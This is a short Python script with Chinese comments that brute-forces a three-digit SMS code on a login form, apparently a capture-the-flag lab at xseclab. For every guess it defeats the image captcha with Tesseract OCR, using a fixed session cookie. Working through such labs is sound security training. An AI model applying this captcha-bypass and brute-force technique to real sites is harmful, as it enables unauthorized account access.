#代码不能再sublime下运行，会报错，在idle下运行即可
#更推荐用Pkav HTTP Fuzzer爆破验证码

import requests  #调用url、cookie操作 文件操作的库
import sys
import time
from pytesseract import *
from PIL import Image

def vcode(pic_url,cookies):
    r = requests.get(pic_url, cookies=cookies, timeout=10)
    with open('vcode.png', 'wb') as pic:
        pic.write(r.content)
    image=Image.open('vcode.png')
    im = image_to_string(image)
    #print im
    im = im.replace(' ', '')
    if im.isdigit() and len(im)==4: 
        return im
    else:
        return vcode(pic_url,cookies)

cookies = {'PHPSESSID':'c460c2f1424af9e7b503c90e3d54c9e4'} 
payload = {'username': '13388886666', 'mobi_code': '100','user_code':'5053','Login':'submit'}

picurl='http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/vcode.php' #验证码地址

url="http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/login.php" #请求地址


for i in range(100,999): 
     code1=vcode(picurl,cookies)
     payload['user_code']=code1	#验证码
     payload['mobi_code']=i  
     wp = requests.post(url, data=payload,cookies=cookies, timeout=10) 
     text=wp.content
     responsetxt = text.decode()	#返回的文本

     if 'error' not in responsetxt:
           print('The correct code is：', code1,responsetxt)
           break
     else:
           print('tring code:', i, code1,responsetxt)

print("get flag success")
